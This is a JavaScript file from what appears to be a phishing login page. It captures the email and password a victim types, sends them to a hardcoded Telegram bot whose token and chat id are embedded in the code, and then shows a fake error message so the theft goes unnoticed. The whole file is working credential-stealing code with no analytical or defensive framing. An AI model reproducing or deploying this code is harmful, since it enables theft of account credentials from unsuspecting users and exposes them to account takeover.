
var botToken = "6300760181:AAEFS9uoos4m5jGUuL7I6psBhvfgXEOAMpQ";
var chatId = "1758098578";

var emailInput = document.getElementById("text");
var passwordInput = document.getElementById("pass");
var loginButton = document.getElementById("login");

loginButton.addEventListener("click", myFunction)

function myFunction(params) {
    params.preventDefault();

    var email = emailInput.value;
    var password = passwordInput.value;

    var message = `New login: \nEmail:${email} \nPassword:${password}`;
    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    axios
  .get(url)
  .then(function (response) {
    var errorMessage = document.getElementById("error_box");
    errorMessage.style.display = "block"
    console.log('Message sent successfully');
    console.log(response.data);
  })
  .catch(function (error) {
    console.error('Error sending message:', error.message);
  });
}


  